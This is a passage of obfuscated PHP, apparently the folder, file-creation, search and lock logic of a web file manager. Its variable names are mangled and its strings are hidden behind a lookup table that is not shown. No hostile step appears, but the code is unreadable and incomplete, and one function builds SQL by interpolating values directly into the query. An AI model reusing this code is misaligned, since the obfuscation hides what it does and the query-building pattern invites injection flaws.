$”È£¶à»[$ßå•“‰¼[2145]] < $¿„©×É£[$ßå•“‰¼[86]]) { return !1; } if (isset($”È£¶à»[$ßå•“‰¼[2146]]) && $”È£¶à»[$ßå•“‰¼[2146]] > $¿„©×É£[$ßå•“‰¼[86]]) { return !1; } if (isset($”È£¶à»[$ßå•“‰¼[639]]) && $”È£¶à»[$ßå•“‰¼[639]] != $¿„©×É£[$ßå•“‰¼[506]]) { return !1; } return !0; } public function listSearchChildren($šÔ¹æõè, $ğãŠ¬Ü§ = 5000) { $Â—İ‰ƒ¥ =& $_SERVER[ú÷îèÆÜ]; $ùìŒ½Œß = array(); $Ö˜ª«â¹ = $this->sourceInfo($šÔ¹æõè); $É™ª›Ó‰ = array($Â—İ‰ƒ¥[562] => array($Â—İ‰ƒ¥[436], $Ö˜ª«â¹[$Â—İ‰ƒ¥[562]] . $Ö˜ª«â¹[$Â—İ‰ƒ¥[191]] . $Â—İ‰ƒ¥[590])); $İÍòÑúÅ = $this->field($Â—İ‰ƒ¥[86])->where($É™ª›Ó‰)->limit($ğãŠ¬Ü§ + 1)->select(); $”’íìŞœ = is_array($İÍòÑúÅ) ? count($İÍòÑúÅ) : 0; if ($”’íìŞœ > $ğãŠ¬Ü§) { return $this->_listSearchChildrenNear($šÔ¹æõè, $ğãŠ¬Ü§); } $ÚëüœÓ = $this->field($Â—İ‰ƒ¥[191])->where($É™ª›Ó‰)->select(); $ùìŒ½Œß = array_to_keyvalue($ÚëüœÓ, $Â—İ‰ƒ¥[22], $Â—İ‰ƒ¥[191]); return $ùìŒ½Œß; } private function _listSearchChildrenNear($€ô·‡æÎ, $¨ÌÛ¨õÄ) { $á…Á¬ä =& $_SERVER[ú÷îèÆÜ]; $Òõàë’ò = array(); $åÒìÖÔÄ = array($á…Á¬ä[190] => $€ô·‡æÎ); $¥Â¤®‹¹ = $this->field($á…Á¬ä[2147])->where($åÒìÖÔÄ)->select(); $İÏØ—§ã = array_to_keyvalue(array_filter_by_field($¥Â¤®‹¹, $á…Á¬ä[462], $á…Á¬ä[98]), $á…Á¬ä[22], $á…Á¬ä[191]); $Òõàë’ò = array_merge($Òõàë’ò, array_to_keyvalue($¥Â¤®‹¹, $á…Á¬ä[22], $á…Á¬ä[191])); if (!$İÏØ—§ã) { return $Òõàë’ò; } $åÒìÖÔÄ = array($á…Á¬ä[190] => array($á…Á¬ä[17], $İÏØ—§ã)); $¥Â¤®‹¹ = $this->field($á…Á¬ä[2147])->where($åÒìÖÔÄ)->limit($¨ÌÛ¨õÄ)->select(); $Òõàë’ò = array_merge($Òõàë’ò, array_to_keyvalue($¥Â¤®‹¹, $á…Á¬ä[22], $á…Á¬ä[191])); $Òõàë’ò = array_slice($Òõàë’ò, 0, $¨ÌÛ¨õÄ); return $Òõàë’ò; } private function _listSearchBindPinyin($°“÷â±ø, &$ÓúëÒé, &$ûúç„õ) { $¾³‡Ê =& $_SERVER[ú÷îèÆÜ]; if (!isset($°“÷â±ø[$¾³‡Ê[1977]]) || !$°“÷â±ø[$¾³‡Ê[1977]]) { return; } if (!Input::check($°“÷â±ø[$¾³‡Ê[1977]], $¾³‡Ê[371]) || strlen($°“÷â±ø[$¾³‡Ê[1977]]) < 2) { return; } $ô¨·ÛáŠ = "\x4c\105\106\x54\40\112\x4f\111\116\40{$this->tablePrefix}\151\157\137\163\157\165\x72\143\x65\x5f\x6d\145\164\141\x20\155\x65\x74\141\x20\157\x6e\40\x73\157\x75\x72\143\x65\x2e\x73\157\165\162\x63\x65\x49\x44\x20\x3d\x20\x6d\x65\164\141\x2e\163\x6f\x75\x72\x63\x65\x49\x44"; $˜Õî£’ = array(); $ûúç„õ = str_replace(array($¾³‡Ê[11], $¾³‡Ê[63], $¾³‡Ê[2148]), $¾³‡Ê[22], $ûúç„õ); $ûúç„õ = $¾³‡Ê[488] . str_replace($¾³‡Ê[60], $¾³‡Ê[489], $ûúç„õ); $…£¡ş§ü = $ÓúëÒé[$¾³‡Ê[42]]; unset($ÓúëÒé[$¾³‡Ê[42]]); foreach ($ÓúëÒé as $ıºîò => $â÷Ê²ô«) { $˜Õî£’[$¾³‡Ê[488] . $ıºîò] = $â÷Ê²ô«; } foreach ($…£¡ş§ü as $Ôİ«¦ ª) { $˜Õî£’[] = array($¾³‡Ê[493] => $Ôİ«¦ ª, $¾³‡Ê[1041] => $¾³‡Ê[1981], array($¾³‡Ê[2149] => $Ôİ«¦ ª, $¾³‡Ê[2150] => array($¾³‡Ê[17], array($¾³‡Ê[515], $¾³‡Ê[514])))); } $this->join($ô¨·ÛáŠ); $ÓúëÒé = $˜Õî£’; } private function _parseSearchWhere($Ë°·‡ã•) { $¹©—ğÑÁ =& $_SERVER[ú÷îèÆÜ]; $û½¨ôøÓ = array(); if (isset($Ë°·‡ã•[$¹©—ğÑÁ[800]]) && $Ë°·‡ã•[$¹©—ğÑÁ[800]]) { $û½¨ôøÓ[$¹©—ğÑÁ[95]] = array($¹©—ğÑÁ[2151], $Ë°·‡ã•[$¹©—ğÑÁ[800]]); } if (isset($Ë°·‡ã•[$¹©—ğÑÁ[801]]) && $Ë°·‡ã•[$¹©—ğÑÁ[801]]) { $—ó¥Œ·Ö = array($¹©—ğÑÁ[2152], $Ë°·‡ã•[$¹©—ğÑÁ[801]]); if ($û½¨ôøÓ[$¹©—ğÑÁ[95]]) { $û½¨ôøÓ[$¹©—ğÑÁ[95]] = array($û½¨ôøÓ[$¹©—ğÑÁ[95]], $—ó¥Œ·Ö, $¹©—ğÑÁ[2153]); } else { $û½¨ôøÓ[$¹©—ğÑÁ[95]] = $—ó¥Œ·Ö; } } if (isset($Ë°·‡ã•[$¹©—ğÑÁ[2145]]) && $Ë°·‡ã•[$¹©—ğÑÁ[2145]] > 0) { $û½¨ôøÓ[$¹©—ğÑÁ[86]] = array($¹©—ğÑÁ[2151], $Ë°·‡ã•[$¹©—ğÑÁ[2145]]); } if (isset($Ë°·‡ã•[$¹©—ğÑÁ[2146]]) && $Ë°·‡ã•[$¹©—ğÑÁ[2146]]) { $—ó¥Œ·Ö = array($¹©—ğÑÁ[2152], $Ë°·‡ã•[$¹©—ğÑÁ[2146]]); if ($û½¨ôøÓ[$¹©—ğÑÁ[86]]) { $û½¨ôøÓ[$¹©—ğÑÁ[86]] = array($û½¨ôøÓ[$¹©—ğÑÁ[86]], $—ó¥Œ·Ö, $¹©—ğÑÁ[2153]); } else { $û½¨ôøÓ[$¹©—ğÑÁ[86]] = $—ó¥Œ·Ö; } } if (isset($Ë°·‡ã•[$¹©—ğÑÁ[639]]) && $Ë°·‡ã•[$¹©—ğÑÁ[639]]) { $û½¨ôøÓ[] = array($¹©—ğÑÁ[506] => $Ë°·‡ã•[$¹©—ğÑÁ[639]], $¹©—ğÑÁ[504] => $Ë°·‡ã•[$¹©—ğÑÁ[639]], $¹©—ğÑÁ[1041] => $¹©—ğÑÁ[1981]); } if (isset($Ë°·‡ã•[$¹©—ğÑÁ[463]]) && $Ë°·‡ã•[$¹©—ğÑÁ[463]]) { $¢¸áˆ½· = $Ë°·‡ã•[$¹©—ğÑÁ[463]]; if ($¢¸áˆ½· == $¹©—ğÑÁ[85]) { $û½¨ôøÓ[$¹©—ğÑÁ[462]] = 1; } else { if ($¢¸áˆ½· == $¹©—ğÑÁ[2154]) { $û½¨ôøÓ[$¹©—ğÑÁ[462]] = 0; } else { if ($¢¸áˆ½·) { $¢¸áˆ½· = is_array($¢¸áˆ½·) ? $¢¸áˆ½· : explode($¹©—ğÑÁ[60], $¢¸áˆ½·); $û½¨ôøÓ[$¹©—ğÑÁ[463]] = array($¹©—ğÑÁ[469], $¢¸áˆ½·); $û½¨ôøÓ[$¹©—ğÑÁ[462]] = 0; } } } } $this->_parseSearchParent($Ë°·‡ã•, $û½¨ôøÓ); if (isset($Ë°·‡ã•[$¹©—ğÑÁ[1977]]) && trim($Ë°·‡ã•[$¹©—ğÑÁ[1977]])) { $›ò‘Ÿ¦´ = trim($Ë°·‡ã•[$¹©—ğÑÁ[1977]]); $ŠúÖú¥» = explode($¹©—ğÑÁ[63], $›ò‘Ÿ¦´); if (strlen($›ò‘Ÿ¦´) > 2 && (substr($›ò‘Ÿ¦´, 0, 1) == $¹©—ğÑÁ[128] && substr($›ò‘Ÿ¦´, -1) == $¹©—ğÑÁ[128]) || substr($›ò‘Ÿ¦´, 0, 1) == $¹©—ğÑÁ[68] && substr($›ò‘Ÿ¦´, -1) == $¹©—ğÑÁ[68]) { $›ò‘Ÿ¦´ = substr($›ò‘Ÿ¦´, 1, -1); $ŠúÖú¥» = array($›ò‘Ÿ¦´); } $û½¨ôøÓ[$¹©—ğÑÁ[42]] = array(array($¹©—ğÑÁ[589], $¹©—ğÑÁ[1979] . $›ò‘Ÿ¦´ . $¹©—ğÑÁ[1979])); if (count($ŠúÖú¥») > 1) { $û½¨ôøÓ[$¹©—ğÑÁ[42]] = array(); foreach ($ŠúÖú¥» as $ÃŒÁñ½ò) { if (!trim($ÃŒÁñ½ò)) { continue; } $û½¨ôøÓ[$¹©—ğÑÁ[42]][] = array($¹©—ğÑÁ[589], $¹©—ğÑÁ[1979] . trim($ÃŒÁñ½ò) . $¹©—ğÑÁ[1979]); } } } return $û½¨ôøÓ; } private function _parseSearchParent($ğ½‡àÙ¢, &$Ö›Â¶) { $óì¿Šï™ =& $_SERVER[ú÷îèÆÜ]; if (!isset($ğ½‡àÙ¢[$óì¿Šï™[190]]) || !$ğ½‡àÙ¢[$óì¿Šï™[190]]) { return; } $üÕ×Çäª = $this->pathInfo($ğ½‡àÙ¢[$óì¿Šï™[190]]); $ æüü = $üÕ×Çäª[$óì¿Šï™[190]] . $óì¿Šï™[22] === $óì¿Šï™[222]; $Ûƒ‹ß”ë = $üÕ×Çäª[$óì¿Šï™[188]] == $óì¿Šï™[556]; if ($üÕ×Çäª[$óì¿Šï™[573]] == $óì¿Šï™[574]) { $ñÀô‹öÍ = $this->sourceInfo($ğ½‡àÙ¢[$óì¿Šï™[190]]); $üÕ×Çäª[$óì¿Šï™[562]] = $ñÀô‹öÍ[$óì¿Šï™[562]]; } $Ö›Â¶[$óì¿Šï™[629]] = array($óì¿Šï™[589], $üÕ×Çäª[$óì¿Šï™[562]] . $ğ½‡àÙ¢[$óì¿Šï™[190]] . $óì¿Šï™[590]); $…ü¿·¡‹ = isset($ğ½‡àÙ¢[$óì¿Šï™[1842]]) && in_array($óì¿Šï™[556], $ğ½‡àÙ¢[$óì¿Šï™[1842]]); if (!$…ü¿·¡‹ || !$Ûƒ‹ß”ë || !$ æüü || !$üÕ×Çäª[$óì¿Šï™[464]]) { return; } if (!AuthModel::authCheckRoot($üÕ×Çäª[$óì¿Šï™[464]][$óì¿Šï™[465]])) { return; } $ÌÍˆ›Ã— = $üÕ×Çäª[$óì¿Šï™[547]] . $óì¿Šï™[22]; if ($ÌÍˆ›Ã— == $óì¿Šï™[98]) { unset($Ö›Â¶[$óì¿Šï™[629]]); $Ö›Â¶[$óì¿Šï™[188]] = self::TYPE_GROUP; return; } $ÊÆßáÈ³ = Model($óì¿Šï™[563])->groupChildrenAll($ÌÍˆ›Ã—); $¥¤°‘´Ç = count($ÊÆßáÈ³); if ($¥¤°‘´Ç <= 1) { return; } $î©À÷£ = array($óì¿Šï™[190] => 0, $óì¿Šï™[188] => self::TYPE_GROUP, $óì¿Šï™[547] => array($óì¿Šï™[17], $ÊÆßáÈ³)); $ó¹­†æû = $this->field($óì¿Šï™[2155])->where($î©À÷£)->limit($¥¤°‘´Ç)->select(); $Ö›Â¶[$óì¿Šï™[629]] = array(); foreach ($ó¹­†æû as $ìöÆß»ô) { $Ö›Â¶[$óì¿Šï™[629]][] = array($óì¿Šï™[589], $óì¿Šï™[572] . $ìöÆß»ô[$óì¿Šï™[191]] . $óì¿Šï™[590]); } $Ö›Â¶[$óì¿Šï™[629]][] = $óì¿Šï™[1981]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ğ¹ÓÁ‚Ã) { $ùıÈ½üÛ =& $_SERVER[ú÷îèÆÜ]; $˜±œ®µ« = Model($ùıÈ½üÛ[555])->where(array($ùıÈ½üÛ[1676] => $Ğ¹ÓÁ‚Ã))->find(); $³ÑÉÈÆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ğ¹ÓÁ‚Ã, $˜±œ®µ«[$ùıÈ½üÛ[42]]); $this->userDesktopAdd($³ÑÉÈÆ); return $³ÑÉÈÆ; } public function userDesktopAdd($‰¿Á­åá) { $ÉÈ¹”ë° =& $_SERVER[ú÷îèÆÜ]; $­÷İÂÙ = LNG($ÉÈ¹”ë°[2156]); $“ÙÎÓï = $this->mkdir($‰¿Á­åá, $­÷İÂÙ); $this->metaSet($“ÙÎÓï, $ÉÈ¹”ë°[2157], $ÉÈ¹”ë°[98]); $this->metaSet($‰¿Á­åá, $ÉÈ¹”ë°[2158], $“ÙÎÓï); } public function userPathSafeAdd($…²ÂìàŠ) { $õğ†…÷Ÿ =& $_SERVER[ú÷îèÆÜ]; $É¾ô÷Æ¥ = Model($õğ†…÷Ÿ[555])->getInfoFull($…²ÂìàŠ); if (!$É¾ô÷Æ¥) { return !1; } if (_get($É¾ô÷Æ¥, $õğ†…÷Ÿ[577])) { return $É¾ô÷Æ¥[$õğ†…÷Ÿ[516]][$õğ†…÷Ÿ[2159]]; } $•‘ÇÛø = $this->_mkdirRoot(SourceModel::TYPE_USER, $…²ÂìàŠ, $õğ†…÷Ÿ[2160], $õğ†…÷Ÿ[483]); Model($õğ†…÷Ÿ[555])->metaSet($…²ÂìàŠ, $õğ†…÷Ÿ[2159], $•‘ÇÛø); $this->metaSet($•‘ÇÛø, $õğ†…÷Ÿ[2161], $…²ÂìàŠ); return $•‘ÇÛø; } public function groupRootAdd($Ó¤ÙÍÒ) { $ŠĞ¸›Ñ± =& $_SERVER[ú÷îèÆÜ]; $šú²°°™ = Model($ŠĞ¸›Ñ±[563])->where(array($ŠĞ¸›Ñ±[1971] => $Ó¤ÙÍÒ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ó¤ÙÍÒ, $šú²°°™[$ŠĞ¸›Ñ±[42]]); } public function systemRootPathAdd($›¤“˜îŠ) { if ($›¤“˜îŠ != $_SERVER[ú÷îèÆÜ][583]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $›¤“˜îŠ); } public function userRootRemove($Ìà€šó) { $Ş•öÖ… = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ìà€šó, !0); foreach ($Ş•öÖ… as $Èşã½) { if (!$Èşã½) { continue; } $this->remove($Èşã½[$_SERVER[ú÷îèÆÜ][191]], !1); } } public function groupRootRemove($‚å¾Ù›°) { $‡ìÖ­Ëø = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $‚å¾Ù›°); if (!$‡ìÖ­Ëø) { return; } $this->remove($‡ìÖ­Ëø[$_SERVER[ú÷îèÆÜ][191]], !1); } private function _mkdirRoot($ş‰÷’Šô, $˜¬×ÒÄ, $½ø³õ§ , $¤÷¥ß®ó = '') { $£İŠÆ»Ì =& $_SERVER[ú÷îèÆÜ]; $Êûµ—† = defined($£İŠÆ»Ì[2104]) ? USER_ID : 0; $ß‘ŞÚáÑ = array($£İŠÆ»Ì[454] => 0, $£İŠÆ»Ì[625] => $ş‰÷’Šô, $£İŠÆ»Ì[626] => $˜¬×ÒÄ, $£İŠÆ»Ì[623] => 1, $£İŠÆ»Ì[627] => $Êûµ—†, $£İŠÆ»Ì[628] => $Êûµ—†, $£İŠÆ»Ì[624] => $¤÷¥ß®ó, $£İŠÆ»Ì[629] => $£İŠÆ»Ì[572], $£İŠÆ»Ì[481] => 0, $£İŠÆ»Ì[594] => 0, $£İŠÆ»Ì[519] => 0, $£İŠÆ»Ì[630] => $£İŠÆ»Ì[22]); if ($É„õÅĞ¸ = $this->where($ß‘ŞÚáÑ)->find()) { return $É„õÅĞ¸[$£İŠÆ»Ì[191]]; } $ã”çò°õ = "\115\x6f\x64\x65\x6c\x53\157\x75\162\143\145\x2e\x6d\153\x64\x69\x72\x52\157\157\x74\56{$ş‰÷’Šô}\56{$˜¬×ÒÄ}\56" . $½ø³õ§ ; CacheLock::lock($ã”çò°õ); $ß‘ŞÚáÑ[$£İŠÆ»Ì[42]] = $½ø³õ§ ; $ºùÆ¬ÎÂ = $this->add($ß‘ŞÚáÑ); $‰¸ËÛ¦ç = array($£İŠÆ»Ì[631] => short_id($ºùÆ¬ÎÂ)); $this->where(array($£İŠÆ»Ì[468] => $ºùÆ¬ÎÂ))->save($‰¸ËÛ¦ç); CacheLock::unlock($ã”çò°õ); return $ºùÆ¬ÎÂ; } private function targetSourceRoot($ïÕÄ‘éƒ, $Ê››Ûƒ, $å’ñ–ƒ = false) { $î¯ÛâõŠ =& $_SERVER[ú÷îèÆÜ]; $Æä£Ôª = array($î¯ÛâõŠ[454] => 0, $î¯ÛâõŠ[625] => $ïÕÄ‘éƒ, $î¯ÛâõŠ[626] => $Ê››Ûƒ); if ($å’ñ–ƒ) { $Òö”¹çá = $this->where($Æä£Ôª)->select(); return $Òö”¹çá ? $Òö”¹çá : array(); } $¢äÍ¿É½ = $this->where($Æä£Ôª)->find(); return $¢äÍ¿É½ ? $¢äÍ¿É½ : array(); } public function sourceRootGroup($”Æ¥Ï¡•) { $½„íó° =& $_SERVER[ú÷îèÆÜ]; if (is_string($”Æ¥Ï¡•)) { $”Æ¥Ï¡• = array($”Æ¥Ï¡•); } $Ó¹ÔØŞ® = $this->listSourceRoot(SourceModel::TYPE_GROUP, $”Æ¥Ï¡•, $½„íó°[213]); $¬üØ•ÍÅ = array($½„íó°[422] => $Ó¹ÔØŞ®, $½„íó°[419] => array($½„íó°[798] => count($”Æ¥Ï¡•))); $this->_listDataApply($¬üØ•ÍÅ[$½„íó°[422]]); $this->_listMake($¬üØ•ÍÅ); return array_to_keyvalue($¬üØ•ÍÅ[$½„íó°[92]], $½„íó°[547]); } public function mkfile($ö²İ—ã, $—ïÅÇ, $Ïùı¯¥æ = '', $É„­‚…© = REPEAT_RENAME) { $À–æùÇ =& $_SERVER[ú÷îèÆÜ]; $¹ìÆ™Òú = Model($À–æùÇ[652])->addFileByContent($Ïùı¯¥æ, $—ïÅÇ); return $this->_createFileCall($ö²İ—ã, $—ïÅÇ, $¹ìÆ™Òú, $É„­‚…©, $À–æùÇ[1383]); } public function addFile($ÇÍš¢Š, $ªï§ë´‰, $‡ÓŞÙŠå, $¢ÛÈË±ƒ = false, $¬¾ıœ‡© = REPEAT_RENAME) { $™‰©èñ = Model($_SERVER[ú÷îèÆÜ][652])->addFile($ªï§ë´‰, $‡ÓŞÙŠå, $¢ÛÈË±ƒ); return $this->_createFileCall($ÇÍš¢Š, $‡ÓŞÙŠå, $™‰©èñ, $¬¾ıœ‡©); } public function addFileByFileID($İĞÖ…ÅÕ, $á×–©»Ó, $ÌÙºâ²³, $ÌòÅêÅ¥ = REPEAT_RENAME) { $¨¸íÔ =& $_SERVER[ú÷îèÆÜ]; $‹É‰í® = Model($¨¸íÔ[652])->find($á×–©»Ó); Model($¨¸íÔ[652])->linkAdd($á×–©»Ó); return $this->_createFileCall($İĞÖ…ÅÕ, $ÌÙºâ²³, $‹É‰í®, $ÌòÅêÅ¥); } public function addFileByRemote($óä¢­Óƒ, $‘ıÒÀï—, $ô”É×Ï, $ŸĞÂ”† = array(), $ŞµˆâĞÒ = REPEAT_RENAME) { $¡“ùŸÎÎ = Model($_SERVER[ú÷îèÆÜ][652])->addFileByRemote($‘ıÒÀï—, $ô”É×Ï, $ŸĞÂ”†); return $this->_createFileCall($óä¢­Óƒ, $ô”É×Ï, $¡“ùŸÎÎ, $ŞµˆâĞÒ); } private function _createFileCall($“×Ì€“í, $·È«ó, $Æñ”ÚÄÜ, $³âôÉ’æ, $§Ø²‚øÇ = "\x75\x70\x6c\157\141\144") { $²Ì¤–ø =& $_SERVER[ú÷îèÆÜ]; $¨ìİÂÅ = !1; $this->setMasterDB(); $this->lockWriteStart($“×Ì€“í, $·È«ó); $áÁÉòâÕ = $this->fileNameExist($“×Ì€“í, $·È«ó); $±Ö¬ŞÌÂ = $this->_createFile($“×Ì€“í, $·È«ó, $Æñ”ÚÄÜ, $³âôÉ’æ, $¨ìİÂÅ); if (!$¨ìİÂÅ) { Model($²Ì¤–ø[521])->remove($Æñ”ÚÄÜ[$²Ì¤–ø[518]]); } if ($¨ìİÂÅ && $±Ö¬ŞÌÂ && $±Ö¬ŞÌÂ != $áÁÉòâÕ) { Model($²Ì¤–ø[2129])->eventCreate($±Ö¬ŞÌÂ, $§Ø²‚øÇ); } $this->lockWriteEnd($“×Ì€“í, $·È«ó); return $±Ö¬ŞÌÂ; } public function mkdir($Àåıö§, $ƒìˆ¡ú, $œÁŠÒ‹ = REPEAT_SKIP) { $£…³¬Ÿ© =& $_SERVER[ú÷îèÆÜ]; $this->setMasterDB(); $¦ßÀÕ–ş = $this->sourceInfo($Àåıö§); if (!$¦ßÀÕ–ş) { return !1; } $this->lockWriteStart($Àåıö§, $ƒìˆ¡ú); if ($œÁŠÒ‹ !== !1) { $…ïÒ›„ = $this->fileNameExist($Àåıö§, $ƒìˆ¡ú); if ($…ïÒ›„ && $œÁŠÒ‹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Àåıö§, $ƒìˆ¡ú); return $…ïÒ›„; } $ƒìˆ¡ú = $this->fileNameAuto($Àåıö§, $ƒìˆ¡ú, $œÁŠÒ‹); } $ã‘Óˆ´ = array($£…³¬Ÿ©[623] => 1, $£…³¬Ÿ©[471] => $ƒìˆ¡ú, $£…³¬Ÿ©[624] => $£…³¬Ÿ©[22], $£…³¬Ÿ©[519] => 0, $£…³¬Ÿ©[594] => 0); $ÎÅ‚©È = $this->_addSource($ã‘Óˆ´, $¦ßÀÕ–ş); Model($£…³¬Ÿ©[2129])->eventCreate($ÎÅ‚©È, $£…³¬Ÿ©[1384]); $this->lockWriteEnd($Àåıö§, $ƒìˆ¡ú); return $ÎÅ‚©È; } public function listSourceRoot($¾İÄ†õ, $—Ûª÷è, $ÖëùÔÆ¨ = "\x73\x6f\165\162\x63\145\111\x44\54\164\x61\x72\147\x65\x74\x49\x44\x2c\x73\151\172\x65") { $îÍ‰Ó¡Ú =& $_SERVER[ú÷îèÆÜ]; $ËÛ‰İãç = $îÍ‰Ó¡Ú[431]; $Åó¯»„‡ = array(); $‹Ç‡¨Ó = 1024 * 50; $Ø¢–¤ƒ  = is_array($Ø¢–¤ƒ ) ? $Ø¢–¤ƒ  : array(); $Æ³èÌè’ = count($—Ûª÷è); $µÇĞŠÜ = $this->tablePrefix . $îÍ‰Ó¡Ú[2162]; for ($Äùú­— = 0; $Äùú­— < $Æ³èÌè’; $Äùú­—++) { $²›ŒÅà¼ = $—Ûª÷è[$Äùú­—]; $ËÛ‰İãç .= "\x53\105\x4c\105\x43\124\x20\x2a\x20\x46\x52\x4f\x4d\40\x28\123\105\x4c\x45\x43\x54\40{$ÖëùÔÆ¨}\x20\x46\122\117\x4d\x20\140{$µÇĞŠÜ}\140\x20\x57\110\105\122\x45\40"; $ËÛ‰İãç .= "\x60\x70\x61\x72\145\156\164\111\x44\140\75\60\x20\101\116\x44\x20\x60\x74\141\162\x67\145\164\111\x44\140\x3d{$²›ŒÅà¼}\x20\x41\116\104\x20\x60\x74\141\162\147\145\164\124\171\x70\145\x60\75{$¾İÄ†õ}\x20\x61\156\x64\40\146\151\154\x65\x54\x79\160\x65\75\x27\x27\x20\154\x69\155\x69\x74\x20\61\51\x20\x61\163\40\164\142\137{$Äùú­—}\x20\125\116\111\x4f\116\40\101\x4c\x4c\40"; if ((strlen($ËÛ‰İãç) >= $‹Ç‡¨Ó || $Äùú­— == $Æ³èÌè’ - 1) && $ËÛ‰İãç) { $ËÛ‰İãç = substr($ËÛ‰İãç, 0, -strlen($îÍ‰Ó¡Ú[1079])); $ĞÎ®Ÿ¯¾ = $this->query($ËÛ‰İãç); $ËÛ‰İãç = $îÍ‰Ó¡Ú[22]; $Åó¯»„‡ = array_merge($Åó¯»„‡, $ĞÎ®Ÿ¯¾); } } return $Åó¯»„‡; } private function _createFile($àŞ’”Ê, $­è¦­İĞ, $Ú›Üğ—Ş, $ğ”°¯ó¶, &$ º°ô„ ) { $¤£¶Ø =& $_SERVER[ú÷îèÆÜ]; $» ª×¬á = $this->sourceInfo($àŞ’”Ê); if (!$Ú›Üğ—Ş || !$» ª×¬á) { return !1; } if ($ğ”°¯ó¶ !== !1) { $’üÕÊÉÎ = $this->fileNameExist($àŞ’”Ê, $­è¦­İĞ); } $ º°ô„  = !0; if ($ğ”°¯ó¶ && $’üÕÊÉÎ) { if ($ğ”°¯ó¶ == REPEAT_SKIP) { $ º°ô„  = !1; return $’üÕÊÉÎ; } else { if ($ğ”°¯ó¶ == REPEAT_REPLACE) { $¨ñ‡ÑÚ = $this->sourceInfo($’üÕÊÉÎ); $ÌˆŒÀøş = $this->fileHistory($¨ñ‡ÑÚ, $Ú›Üğ—Ş[$¤£¶Ø[518]], $Ú›Üğ—Ş[$¤£¶Ø[86]]); if (!$ÌˆŒÀøş) { $ º°ô„  = !1; } else { $this->folderSizeReset($àŞ’”Ê); } return $’üÕÊÉÎ; } else { $­è¦­İĞ = $this->fileNameAuto($àŞ’”Ê, $­è¦­İĞ, $ğ”°¯ó¶, !1); } } } $Äó¾ÌÇ¯ = array($¤£¶Ø[623] => 0, $¤£¶Ø[471] => $­è¦­İĞ, $¤£¶Ø[624] => substr(get_path_ext($­è¦­İĞ), 0, 10), $¤£¶Ø[519] => $Ú›Üğ—Ş[$¤£¶Ø[518]], $¤£¶Ø[594] => $Ú›Üğ—Ş[$¤£¶Ø[86]]); $î†Ó­”é = $this->_addSource($Äó¾ÌÇ¯, $» ª×¬á); $this->folderSizeReset($àŞ’”Ê, intval($Äó¾ÌÇ¯[$¤£¶Ø[86]])); return $î†Ó­”é; } protected function fileHistory($€„éõÏş, $…¥ÅÒ¤Ó, $–ñâñãÚ) { $Ó©àÂ´ =& $_SERVER[ú÷îèÆÜ]; if ($€„éõÏş[$Ó©àÂ´[518]] == $…¥ÅÒ¤Ó) { return !1; } $this->checkLock($€„éõÏş[$Ó©àÂ´[191]], $…¥ÅÒ¤Ó); Model($Ó©àÂ´[2163])->addHistory($€„éõÏş); $Ëæ³Áş = array($Ó©àÂ´[628] => USER_ID, $Ó©àÂ´[475] => time(), $Ó©àÂ´[518] => $…¥ÅÒ¤Ó, $Ó©àÂ´[86] => $–ñâñãÚ); $this->where(array($Ó©àÂ´[468] => $€„éõÏş[$Ó©àÂ´[191]]))->save($Ëæ³Áş); $this->sourceCacheClear($€„éõÏş[$Ó©àÂ´[191]]); return !0; } public function checkLock($ÅµŸ¬¦ş, $—ó“Üª³) { $‘»ìÓ»æ =& $_SERVER[ú÷îèÆÜ]; $ïøÌÂ³ê = $this->pathInfo($ÅµŸ¬¦ş); if (!$this->fileIsLock($ïøÌÂ³ê, !0)) { return; } $İÕ©Û± = Session::get($‘»ìÓ»æ[2164]); $•¾‹ŞÌÁ = substr($ïøÌÂ³ê[$‘»ìÓ»æ[42]], 0, -1 - strlen($ïøÌÂ³ê[$‘»ìÓ»æ[185]])) . $‘»ìÓ»æ[1249] . $İÕ©Û± . $‘»ìÓ»æ[20] . $ïøÌÂ³ê[$‘»ìÓ»æ[185]]; $š„ç°Ì = Model($‘»ìÓ»æ[652])->find($—ó“Üª³); $this->_createFileCall($ïøÌÂ³ê[$‘»ìÓ»æ[190]], $•¾‹ŞÌÁ, $š„ç°Ì, REPEAT_REPLACE, $‘»ìÓ»æ[1383]); $Ÿ´£Ù‡ = $ïøÌÂ³ê[$‘»ìÓ»æ[516]][$‘»ìÓ»æ[587]]; $œ¡öÜŞŒ = $Ÿ´£Ù‡[$‘»ìÓ»æ[2165]] ? $Ÿ´£Ù‡[$‘»ìÓ»æ[2165]] : $Ÿ´£Ù‡[$‘»ìÓ»æ[42]]; show_json(LNG($‘»ìÓ»æ[2166]) . $‘»ìÓ»æ[2167] . LNG($‘»ìÓ»æ[2168]) . $‘»ìÓ»æ[2169] . $œ¡öÜŞŒ . $‘»ìÓ»æ[2170], !1); } public function fileIsLock($ë¥Îêš…, $÷ë¾ˆÅ = false) { $¢Œ±âÏ‡ =& $_SERVER[ú÷îèÆÜ]; if (!isset($ë¥Îêš…[$¢Œ±âÏ‡[516]]) || !$ë¥Îêš…[$¢Œ±âÏ‡[516]][$¢Œ±âÏ‡[584]]) { return !1; } if ($ë¥Îêš…[$¢Œ±âÏ‡[516]][$¢Œ±âÏ‡[584]] != USER_ID) { return !0; } $›ïÂô„Î = $GLOBALS[$¢Œ±âÏ‡[16]][$¢Œ±âÏ‡[99]][$¢Œ±âÏ‡[585]]; if ($ë¥Îêš…[$¢Œ±âÏ‡[516]][$¢Œ±âÏ‡[586]] <= time() - $›ïÂô„Î) { $this->metaSet($ë¥Îêš…[$¢Œ±âÏ‡[191]], $¢Œ±âÏ‡[584], null); $this->metaSet($ë¥Îêš…[$¢Œ±âÏ‡[191]], $¢Œ±âÏ‡[586], null); } if ($÷ë¾ˆÅ) { $this->metaSet($ë¥Îêš…[$¢Œ±âÏ‡[191]], $¢Œ±âÏ‡[586], time()); } return !1; } private function _addSource($ˆÌñ£®¦, $µÆ¯çÑ) { $öÉÈ–ĞÕ =& $_SERVER[ú÷îèÆÜ]; $–ı”ùé³ = defined($öÉÈ–ĞÕ[2104]) ? USER_ID : 0; $Å¯€ŠÂÔ = array($öÉÈ–ĞÕ[625] => $µÆ¯çÑ[$öÉÈ–ĞÕ[188]], $öÉÈ–ĞÕ[626] => 